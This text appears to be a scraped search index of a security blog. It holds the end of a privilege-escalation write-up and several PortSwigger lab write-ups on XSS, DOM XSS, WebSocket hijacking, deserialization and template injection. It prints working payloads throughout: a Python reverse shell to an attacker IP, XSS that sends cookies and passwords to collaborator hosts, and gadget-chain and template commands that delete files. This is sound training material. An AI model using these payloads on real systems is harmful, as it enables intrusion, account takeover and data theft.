mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser diego may run the following commands on forgot: (ALL) NOPASSWD: /opt/security/ml_security.pyTensorflow VulnerabilityIf we check the /opt/security/ml_security.py we’ll find the tensorflow import.#!/usr/bin/python3import sysimport csv...from urllib.parse import unquotefrom sklearn import model_selectionfrom nltk.tokenize import word_tokenizefrom sklearn.linear_model import LogisticRegressionfrom gensim.models.doc2vec import Doc2Vec, TaggedDocumentfrom tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string...We can check tensorflow’s version:diego@forgot:~$ pip3 show tensorflow | grep VersionVersion: 2.6.3This version of Tensorflows is vulnerable to Remote Code Execution. References: https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-2841408 https://github.com/advisories/GHSA-75c9-jrh4-79mcScript /opt/security/ml_security.py loads input from escalate table.reason column in escalate table (app database) resides on 4th position.diego@forgot:~$ mysql -u diego -p&#39;dCb#1!x0%gjq&#39; -D app -e &quot;show columns from escalate;&quot;mysql: [Warning] Using a password on the command line interface can be insecure.+--------+------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+--------+------+------+-----+---------+-------+| user | text | YES | | NULL | || issue | text | YES | | NULL | || link | text | YES | | NULL | || reason | text | YES | | NULL | |+--------+------+------+-----+---------+-------+The vulnerability is pretty trivial to exploit if we check the PoC: https://github.com/advisories/GHSA-75c9-jrh4-79mcWe just have to keep in mind that we need to inject our payload into reason column:insert into escalate values (&quot;user&quot;,&quot;issue&quot;,&quot;link&quot;,&#39;hello=exec(&quot;&quot;&quot;\\nimport socket\\nimport subprocess\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((&quot;10.10.14.52&quot;,5555))\\nsubprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&quot;&quot;&quot;)&#39;);Run sudo /opt/security/ml_security.py and shell should pop as root. (For the payload above, listener has to be started beforehand on the attackers machine!)" }, { "title": "(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)", "url": "/posts/stored_XSS/", "categories": "Web Application, Cross Site Scripting", "tags": "Notes, Cross Site Scripting, Stored XSS, Portswigger", "date": "2023-01-25 08:00:00 +0100", "snippet": "IntroThis post/writeup is all about the stored XSS Vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.To learn more on the topic, please visit the article linked above at Portswigger’s.TOC Intro TOC Lab: Stored XSS into HTML context with nothing encoded Exploiting cross-site scripting to steal cookies Exploiting cross-site scripting to capture passwords Exploiting cross-site scripting to perform CSRF Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped Stored XSS into anchor href attribute with double quotes HTML-encodedLab: Stored XSS into HTML context with nothing encoded This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the blog post is viewed.This is the webpage that we get on after we spin the lab.We can send a post.Alert triggers on Comment entry:Source Code&amp;lt;section class=&quot;comment&quot;&amp;gt; &amp;lt;p&amp;gt; &amp;lt;img src=&quot;/resources/images/avatarDefault.svg&quot; class=&quot;avatar&quot;&amp;gt; &amp;lt;a id=&quot;author&quot; href=&quot;http://&amp;amp;lt;script&amp;amp;gt;alert(3)&amp;amp;lt;/script&amp;amp;gt;.com&quot;&amp;gt;test&amp;amp;lt;script&amp;amp;gt;alert(2)&amp;amp;lt;/script&amp;amp;gt;&amp;lt;/a&amp;gt; | 27 January 2023 &amp;lt;/p&amp;gt; &amp;lt;p&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/section&amp;gt;Exploiting cross-site scripting to steal cookiesCollaborator has to be used in order to solve the lab This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim’s session cookie, then use this cookie to impersonate the victim.Webpage looks like in the previous lab.We can trigger XSS in the Comment section.Cookie will be printed in the alert popup.As we now need to exfiltrate the token, we’ll need to use payload that will send that token to Burps Collaborator.&amp;lt;script&amp;gt;location=&#39;http://iyk9morvj5u0hqdrwttw8300frli98xx.oastify.com/c=&#39;+document.cookie;&amp;lt;/script&amp;gt;We should soon see an entry in our Collaborator.We can now simply change session token with the one found in Collaborator.Exploiting cross-site scripting to capture passwordsCollaborator has to be used in order to solve the lab This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim’s username and password then use these credentials to log in to the victim’s account.Lab looks exactly the same as the previous ones. We can send posts where XSS vulnerability resides.First we have to find a XSS:This fires an alert.To read the stored passwords, following payload will be used.&amp;lt;input name=username id=username&amp;gt;&amp;lt;input type=password name=password onchange=&quot;if(this.value.length) fetch(&#39;https://b5hjav637onob24mud688qqf46axyqmf.oastify.com&#39;,{method:&#39;POST&#39;,mode: &#39;no-cors&#39;,body:username.value+&#39;:&#39;+this.value});&quot;&amp;gt;Let’s add a comment. We should get a callback from a victim:Log in and finish the lab.Exploiting cross-site scripting to perform CSRF This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments. You can log in to your own account using the following credentials: wiener:peterSame as in the previous lab, there is a Stored XSS in the comment field.This is the payload which will fetch the CSRF token and change the email from victim.&amp;lt;script&amp;gt;function xss(url, text, formData) { fetch(url+&quot;/change-email&quot;, { method: &quot;POST&quot;, body: formData })}function fetchUrl(url, email){ fetch(url).then(r =&amp;gt; r.text().then(text =&amp;gt; { xss(url, text, &#39;email=&#39;+email+&#39;&amp;amp;csrf=&#39;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1]); }))}fetchUrl(&quot;https://0a87006804525819c1b3cb09006500cf.web-security-academy.net/my-account&quot;, &quot;test@test.de&quot;);&amp;lt;/script&amp;gt;Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.If we add a comment and if we check the source code afterwards, we’ll notice that our email addrss get’s embedded into HTML like this&amp;lt;p&amp;gt; &amp;lt;img src=&quot;/resources/images/avatarDefault.svg&quot; class=&quot;avatar&quot;&amp;gt; &amp;lt;a id=&quot;author&quot; href=&quot;http://test.de&quot; onclick=&quot;var tracker={track(){}};tracker.track(&#39;http://test.de&#39;);&quot;&amp;gt;test&amp;lt;/a&amp;gt; | 24 March 2023&amp;lt;/p&amp;gt;If we add single or double quotes, they will get escaped&amp;lt;a id=&quot;author&quot; href=&quot;http://\\&#39;&amp;amp;quot;alert(3).com&quot; onclick=&quot;var tracker={track(){}};tracker.track(&#39;http://\\&#39;&amp;amp;quot;alert(3).com&#39;);&quot;&amp;gt;a&amp;lt;/a&amp;gt;Payload used in Webpage field: http://a?&amp;amp;apos;-alert(1)-&amp;amp;apos;And this is how it got escaped:&amp;lt;a id=&quot;author&quot; href=&quot;http://a?&#39;-alert(1)-&#39;&quot; onclick=&quot;var tracker={track(){}};tracker.track(&#39;http://a?&#39;-alert(1)-&#39;&#39;);&quot;&amp;gt;s&amp;lt;/a&amp;gt;Alert has fired and lab has been solved.Stored XSS into anchor href attribute with double quotes HTML-encoded This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.Injection in the href attribute ==&amp;gt; javascript:alert(1)." }, { "title": "(Portswigger/WebAcademy) - DOM-based Vulnerabilities", "url": "/posts/DOM_based_vulns/", "categories": "Web Application, DOM-based Vulnerabilities", "tags": "Notes, DOM-based Vulnerabilities, Portswigger", "date": "2023-01-15 08:00:00 +0100", "snippet": "IntroThis post/writeup is all about the DOM-based Vulnerabilitiess.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.To learn more on the topic, please visit the article linked above at Portswigger’s.TOC Intro TOC DOM XSS using web messages DOM XSS using web messages and a JavaScript URL DOM XSS using web messages and JSON.parse DOM-based open redirectionDOM XSS using web messages This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.When we spin the lab, we’ll notice weird object on the page and if we check the source code, this is the code that relates to it:window.addEventListener(&#39;message&#39;, function(e) { document.getElementById(&#39;ads&#39;).innerHTML = e.data;})To reach the sink, we’ll need to use postMessage method and we can do that by using an iFrame.This is the payload that will be delivered to the victim:&amp;lt;iframe src=&quot;https://0aea00d403ec1405801edaa10086001b.web-security-academy.net/&quot; onload=&quot;this.contentWindow.postMessage(&#39;&amp;lt;img src=1 onerror=print()&amp;gt;&#39;,&#39;*&#39;)&quot;&amp;gt;Keep in mind that postManage can be sent between different windows and/or iframes.DOM XSS using web messages and a JavaScript URL This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.Next lab looks like the previous one, only we are dealing with different vulnerable script:window.addEventListener(&#39;message&#39;, function(e) { var url = e.data; if (url.indexOf(&#39;http:&#39;) &amp;gt; -1 || url.indexOf(&#39;https:&#39;) &amp;gt; -1) { location.href = url; }}, false);Payload:&amp;lt;iframe src=&quot;https://0ad6001e03db14e280f0e957004a00cc.web-security-academy.net/&quot; onload=&quot;this.contentWindow.postMessage(&#39;javascript:print()//http:&#39;,&#39;*&#39;)&quot;&amp;gt;Once the iframe finishes loading, it utilizes the postMessage() method to transmit the JavaScript payload to the main page. An event listener identifies the “http:” string within the payload and forwards the payload to the location.href sink. At this point, the print() function is invoked.DOM XSS using web messages and JSON.parse This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.This lab makes use of following script in the body:window.addEventListener(&#39;message&#39;, function(e) { var iframe = document.createElement(&#39;iframe&#39;), ACMEplayer = {element: iframe}, d; document.body.appendChild(iframe); try { d = JSON.parse(e.data); } catch(e) { return; } switch(d.type) { case &quot;page-load&quot;: ACMEplayer.element.scrollIntoView(); break; case &quot;load-channel&quot;: ACMEplayer.element.src = d.url; break; case &quot;player-height-changed&quot;: ACMEplayer.element.style.width = d.width + &quot;px&quot;; ACMEplayer.element.style.height = d.height + &quot;px&quot;; break; }}, false);This script creates an iFrame if postMessage is recieved, and runs the message through JSON.parse.Payload:&amp;lt;iframe src=https://0aab009a03752c238500be2300570002.web-security-academy.net/ onload=&#39;this.contentWindow.postMessage(&quot;{\\&quot;type\\&quot;:\\&quot;load-channel\\&quot;,\\&quot;url\\&quot;:\\&quot;javascript:print()\\&quot;}&quot;,&quot;*&quot;)&#39;&amp;gt;When the ‘load-channel’ case is triggered in the switch statement, the URL from the received message is set as the source for the iframe. However, in this scenario, the URL in the message actually carries our JavaScript payload.DOM-based open redirection This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.This lab allows adding comments to posts. Button appears with following code:&amp;lt;a href=&#39;#&#39; onclick=&#39;returnURL&#39; = /url=https?:\\/\\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = &quot;/&quot;&#39;&amp;gt;Back to Blog&amp;lt;/a&amp;gt;The url parameter is vulnerable and will take the victim to any url.Payload:https://0a24004903b65f7a82b847bd00d20037.web-security-academy.net/post?postId=10&amp;amp;url=https://exploit-0ace00f503b15fdc8293465c01d700fd.exploit-server.net/" }, { "title": "(Portswigger/WebAcademy) - Websockets", "url": "/posts/websockets/", "categories": "Web Application, Insecure Deserialization", "tags": "Notes, Insecure Deserialization, Portswigger", "date": "2023-01-15 08:00:00 +0100", "snippet": "IntroThis post/writeup is all about the insecure deserialization vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.To learn more on the topic, please visit the article linked above at Portswigger’s.TOC Intro TOC Manipulating WebSocket messages to exploit vulnerabilities Cross-site WebSocket hijacking Manipulating the WebSocket handshake to exploit vulnerabilitiesManipulating WebSocket messages to exploit vulnerabilities This online shop has a live chat feature implemented using WebSockets. Chat messages that you submit are viewed by a support agent in real time. To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent’s browser.When opening the lab, there is a Live chat page. If we check the requests, we will notice that web sockets are being sent.Problem is that sockets aren’t being sanitized when being sent directly!Cross-site WebSocket hijacking This online shop has a live chat feature implemented using WebSockets. To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim’s chat history, then use this gain access to their account.In this lab, there is a XSS filter blocking our IP when trying to inject XSS payloads.We can however circumvent the IP block by using X-Forwarded-For header and reconnect our client to the websocket server.Working payload:&amp;lt;img src=1 oNeRrOr=alert`1`&amp;gt;XSS fires on the /chat page.Manipulating the WebSocket handshake to exploit vulnerabilities This online shop has a live chat feature implemented using WebSockets. It has an aggressive but flawed XSS filter. To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent’s browser.Read the portswigger’s article on cross-site websocket hijacking first, if not familiar with the attack. Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values. Source: https://portswigger.net/web-security/websockets/cross-site-websocket-hijackingBy access /chat, websockets are sent without any CSRF protection.GET /chat HTTP/2Host: 0a6b00630481157482b6c4f7004e008f.web-security-academy.netConnection: UpgradePragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Upgrade: websocketOrigin: https://0a6b00630481157482b6c4f7004e008f.web-security-academy.netSec-Websocket-Version: 13Accept-Encoding: gzip, deflate, brAccept-Language: en-GB,en-US;q=0.9,en;q=0.8Cookie: session=6tzRfIhPXlNV1fZcX67LYDnFIwcJUP71Sec-Websocket-Key: DyvNyiBfSYIGBxRpZJQHKQ==Also by every subsequent chat message, CSRF is not being sent.Consenquently, we can trick the victim to send it’s messages to the same chat and exfiltrate the messages to the collaborator server.&amp;lt;script&amp;gt; var ws = new WebSocket(&#39;wss://0a5400fc03d9ed01817c750e00220084.web-security-academy.net/chat&#39;); ws.onopen = function() { ws.send(&quot;READY&quot;); }; ws.onmessage = function(event) { fetch(&#39;https://b8kg1t8d2s3yfkrk5u9vjk5ktbz2n3bs.oastify.com&#39;, {method: &#39;POST&#39;, mode: &#39;no-cors&#39;, body: event.data}); };&amp;lt;/script&amp;gt;As seen below, we get messages that are being sent in the chat, by exploiting CSRF.Log in by using the stolen credentials to solve the lab." }, { "title": "(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities", "url": "/posts/insecure_deserialization/", "categories": "Web Application, Insecure Deserialization", "tags": "Notes, Insecure Deserialization, Portswigger", "date": "2023-01-15 08:00:00 +0100", "snippet": "IntroThis post/writeup is all about the insecure deserialization vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.To learn more on the topic, please visit the article linked above at Portswigger’s.TOC Intro TOC Modifying serialized objects Modifying serialized data types Using application functionality to exploit insecure deserialization Arbitrary object injection in PHP Exploiting Java deserialization with Apache Commons Exploiting PHP deserialization with a pre-built gadget chain Exploiting Ruby deserialization using a documented gadget chain Developing a custom gadget chain for Java deserialization Developing a custom gadget chain for PHP deserialization Using PHAR deserialization to deploy a custom gadget chainModifying serialized objects This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user carlos. You can log in to your own account using the following credentials: wiener:peterWhen we log in and check the session cookie in the response, we’ll notice serialized (PHP) cookie:To get admin access to the site and delete carlos user, we need to set “admin” boolean from 0 to 1.Modifying serialized data types This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete the user carlos. You can log in to your own account using the following credentials: wiener:peterThis lab is almost the same as before. After we login and take a look at the session cookie, we’ll notice it is serialized.O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;i7hm2hnr7gn7v930j4g325olmpj1jlxt&quot;;}What if we change the access_token from string to boolean and set it to 1O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;b:1;}… We can access the admin panel.Using application functionality to exploit insecure deserialization This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos’s home directory. You can log in to your own account using the following credentials: wiener:peter You also have access to a backup account: gregg:rosebudNot like before, now the objective is to achieve RCE and delete file on the system.After logging in using the provided credentials, we can upload a file to the system.Notice the cookie now being serialized and avatar link also being part of it.We can assume that users/wiener/avatar is a path on a system, and what should happen if we delete the user? Can we modify the value?Let’s delete wiener account and intercept the request or simply modify the cookie and paste it back into the browser.O:4:&quot;User&quot;:3:{s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;qw4t1le8olfxy6e9oieuolamexip9po7&quot;;s:11:&quot;avatar_link&quot;;s:23:&quot;/home/carlos/morale.txt&quot;;}Success!Arbitrary object injection in PHP This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos’s home directory. You will need to obtain source code access to solve this lab. You can log in to your own account using the following credentials: wiener:peterLike in the previous labs, let us login using the provided credentials.This is the cookie now:O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;zeqzazlxc5rinmjqgy4wiz13csnatrsv&quot;;}This lab is about arbitrary object injection and we only have a single object in the cookie, the User Object.If we pay attention to the source code or if we check the tree in target tree in burp, we will find following entry/URL:&amp;lt;!-- TODO: Refactor once /libs/CustomTemplate.php is updated --&amp;gt;By appending tilde, we can read the source code: /libs/CustomTemplate.php~.&amp;lt;?phpclass CustomTemplate { private $template_file_path; private $lock_file_path; public function __construct($template_file_path) { $this-&amp;gt;template_file_path = $template_file_path; $this-&amp;gt;lock_file_path = $template_file_path . &quot;.lock&quot;; } private function isTemplateLocked() { return file_exists($this-&amp;gt;lock_file_path); } public function getTemplate() { return file_get_contents($this-&amp;gt;template_file_path); } public function saveTemplate($template) { if (!isTemplateLocked()) { if (file_put_contents($this-&amp;gt;lock_file_path, &quot;&quot;) === false) { throw new Exception(&quot;Could not write to &quot; . $this-&amp;gt;lock_file_path); } if (file_put_contents($this-&amp;gt;template_file_path, $template) === false) { throw new Exception(&quot;Could not write to &quot; . $this-&amp;gt;template_file_path); } } } function __destruct() { // Carlos thought this would be a good idea if (file_exists($this-&amp;gt;lock_file_path)) { unlink($this-&amp;gt;lock_file_path); } }}?&amp;gt;This is code i used to serialize the object:&amp;lt;?phpclass CustomTemplate { function __destruct() { if (file_exists($this-&amp;gt;lock_file_path)) { unlink($this-&amp;gt;lock_file_path); } }}$customTemplate = new CustomTemplate();$customTemplate-&amp;gt;lock_file_path = &quot;/home/carlos/morale.txt&quot;;$serialized_customTemplate = serialize($customTemplate);echo $serialized_customTemplate;?&amp;gt;The output can now be send in a cookie, regardless the path and the lab should be solved, as __destruct() is automatically invoked.O:14:&quot;CustomTemplate&quot;:1:{s:14:&quot;lock_file_path&quot;;s:23:&quot;/home/carlos/morale.txt&quot;;}Key takeaway here is, without having an access to the source code, the vulnerability would be close to impossible to exploit.Exploiting Java deserialization with Apache Commons This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don’t have source code access, you can still exploit this lab using pre-built gadget chains. To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos’s home directory. You can log in to your own account using the following credentials: wiener:peterAfter logging in this lab, we’re dealing with java as the session cookie implies (mind the rO0...):Cookie: session=rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBpajl4bnNvMWdva2J3bDVjMnQ5MmN1b2Z0aml0a21kNHQABndpZW5lcg%3d%3dBy using ysoserial, we can generate a working payload which will delete the morale.txtjava --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 &quot;rm /home/carlos/morale.txt&quot; | base64 -w 0Exploiting PHP deserialization with a pre-built gadget chain This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don’t have source code access, you can still exploit this lab’s insecure deserialization using pre-built gadget chains. To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos’s home directory. You can log in to your own account using the following credentials: wiener:peterAfter logging in with provided credentials, we’ll find a clue in the source code:&amp;lt;!-- &amp;lt;a href=/cgi-bin/phpinfo.php&amp;gt;Debug&amp;lt;/a&amp;gt; --&amp;gt;Can we access the phpinfo();?The application uses v3.4.0 Zend engine. and Symfony Version: 4.3.6. Secret key appears in the PHP and ENV variables: 4x0ezi5yn8f7hrs210yatqjrowrf6155.The serialized cookie looks like this:O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;k54shxynxin7gsx6xpef2sjgtd593clm&quot;;}By using this code, we can compute the signature.php -r &quot;echo hash_hmac(&#39;sha1&#39;, &#39;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJrNTRzaHh5bnhpbjdnc3g2eHBlZjJzamd0ZDU5M2NsbSI7fQ==&#39;, &#39;4x0ezi5yn8f7hrs210yatqjrowrf6155&#39;) . PHP_EOL;&quot;This was great help: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/symphonyBy checking this post, we learn that PHP generic gadget Chains library can be used, and is PHP equivalent to ysoserial used in the lab before. Link: https://github.com/ambionics/phpggc.We can use Symfony/RCE4 or Symfony/RCE7 and run a command../phpggc Symfony/RCE4 exec &#39;rm /home/carlos/morale.txt&#39; | base64 -w 0Now sign the token and send it and if everything has been done right, the lab should be solved.Exploiting Ruby deserialization using a documented gadget chain This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework. To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos’s home directory. You can log in to your own account using the following credentials: wiener:peterSame as in previous labs, when we log in, we’ll get a cookie assigned:BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVxcGsxMTM4ZmIwenNlc2FxcGNscjc3dG9yNXZrZG8yYgY7B0YKCookie starting with BAh is specific to Ruby on Rails applications.By messing with the cookie value, we’d get an error like this which again implies that we’re working with Ruby:index.rb:13:in `load&amp;amp;apos;: incompatible marshal file format (can&amp;amp;apos;t be read) (TypeError) format version 4.8 required; 105.63 given ...Payload from here: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.htmlModify the last two lines to puts Base64.encode64(payload), replace the command to execute and run the code.luka@cloudipso  ~/tests  ruby r.rb | tr -d &#39;\\n&#39;BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==Developing a custom gadget chain for Java deserialization This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab’s insecure deserialization to obtain the administrator’s password. To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator’s password. Then, log in as the administrator and delete carlos. You can log in to your own account using the following credentials: wiener:peter Note that solving this lab requires basic familiarity with another topic that we’ve covered on the Web Security Academy.tbdDeveloping a custom gadget chain for PHP deserialization This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the morale.txt file from Carlos’s home directory. You can log in to your own account using the following credentials: wiener:petertbdUsing PHAR deserialization to deploy a custom gadget chain This lab does not explicitly use deserialization. However, if you combine PHAR deserialization with other advanced hacking techniques, you can still achieve remote code execution via a custom gadget chain. To solve the lab, delete the morale.txt file from Carlos’s home directory. You can log in to your own account using the following credentials: wiener:petertbd" }, { "title": "(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities", "url": "/posts/ssti/", "categories": "Web Application, Clickjacking vulnerabilities", "tags": "Notes, Server-Side Template Injection, SSTI, Portswigger", "date": "2023-01-15 08:00:00 +0100", "snippet": "IntroThis post/writeup is all about the Clickjacking Vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.To learn more on the topic, please visit the article linked above at Portswigger’s.TOC Intro TOC Basic server-side template injection Basic server-side template injection (code context) Server-side template injection using documentation Server-side template injection in an unknown language with a documented exploit Server-side template injection with information disclosure via user-supplied objects Server-side template injection in a sandboxed environment Server-side template injection with a custom exploitBasic server-side template injection This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template. To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos’s home directory.When we start the lab and open a product, we would see following request which is obviously being reflected:After checking the documentation for ERB templating (Ruby), this synthax should return 49: ==&amp;gt; &amp;lt;%= 7*7 %&amp;gt;.As seen above, we do get 49 reflected. Now we need to delete a file morale.txt.This synthax runs commands on the system:&amp;lt;%= system(&quot;ls -la /home&quot;) %&amp;gt;Basic server-side template injection (code context) This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos’s home directory. You can log in to your own account using the following credentials: wiener:peterLet us log in:[...]blog-post-author-display=&amp;lt;%=+7*7+=&amp;gt;&amp;amp;csrf=kLGizM6pptgkDClzV9yZQKn4Q2OVfEb8When i’ve ran the request above, error occured when sending comming in a blog post, but when i changed the parameter to blog-post-author-display=7*7, the 49 is shown instead of the Name:This one was more tricky to exploit as os lib is not imported and we have to do it first. This is the final payload:blog-post-author-display=user.name\\}\\}{&quot;import os&quot;}\\{\\{os.system(&quot;rm /home/carlos/morale.txt&quot;)Server-side template injection using documentation This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos’s home directory. You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3rWe can login using credentials provided and check the post:Forcing an error revelas that FreeMarker (Java) is being used.Command execution:Now all we have to do is remove the file from the system /home/carlos/morale.txt.Server-side template injection in an unknown language with a documented exploit This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos’s home directory.In this lab, if we pay attention to requests issued from the app, we’ll again see that user input is being reflected in the response through the message parameter.Inserting the `` displays 49 in the output.Working exploit code: Server-side template injection with information disclosure via user-supplied objects This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data. To solve the lab, steal and submit the framework’s secret key. You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3rLike in the previous labs, let us log in, go to a post and try to edit template and insert something like ``:The app is running on python, version 2.7 and is running on Django.Here i just tried the few possible exploits for Python templates and this one gave me the key that we need:Here more information regarding exploitation of Jinja2 can been found: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-sstiServer-side template injection in a sandboxed environment This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos’s home directory. Then submit the contents of the file. You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3rLog in, as in previous labs, go to blog post and edit it. ${7*7} should return 49, when previewing the post.We can access product object as we even see it in the template, e.g.: product.name, product.price.# Let&#39;s what we can get:${product.getClass()} ==&amp;gt; class lab.actions.templateengines.FreeMarkerProduct${product.getClass().getProtectionDomain()} ==&amp;gt; ProtectionDomain (file:/opt/jars/freemarker.jar &amp;lt;no signer certificates&amp;gt;) jdk.internal.loader.ClassLoaders$AppClassLoader@64729b1e 